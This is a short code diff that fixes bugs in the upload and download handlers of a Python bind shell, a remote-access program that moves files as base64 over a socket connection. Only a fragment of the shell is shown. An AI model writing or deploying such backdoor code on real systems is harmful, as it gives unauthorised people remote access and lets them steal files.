@@ -15,7 +15,7 @@ def upload_file(b64_in: bytes, dest_file: str) -> None:
     return
 
 #download
-def download_file(fileToDL: str) -> bytes:s
+def download_file(fileToDL: str) -> bytes:
     with open(fileToDL, "rb") as f:
         DLFile = f.read()  
     b64_DLFile_Encoded = base64.b64encode(DLFile)
@@ -72,11 +72,10 @@ def bindShell() -> None:
 
                 #upload 
                 elif args[0] == upload_cmd:
-                    fileUp == args[1]
-                    print(fileUp)
-                    fileUPdest == args[2].decode('utf-8')
-                    upload_file(fileUP, fileUPdest)
-                    conn.send(b'Uploaded '+fileUP)
+                    fileUp = args[1]
+                    fileUPdest = args[2]
+                    upload_file(fileUp, fileUPdest)
+                    conn.send(b"done\n")
 
 
                 
